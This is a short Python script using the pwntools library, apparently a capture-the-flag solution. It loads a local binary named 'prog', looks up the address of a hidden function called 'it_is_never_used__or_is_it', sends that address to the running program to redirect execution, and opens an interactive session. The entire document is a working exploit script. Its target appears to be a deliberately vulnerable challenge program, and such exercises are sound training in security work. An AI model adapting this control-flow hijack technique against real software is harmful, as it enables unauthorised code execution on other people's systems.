from pwn import *

e = ELF('prog')
addr = hex(e.sym.it_is_never_used__or_is_it)
p = e.process()
p.sendline(addr)
p.interactive()
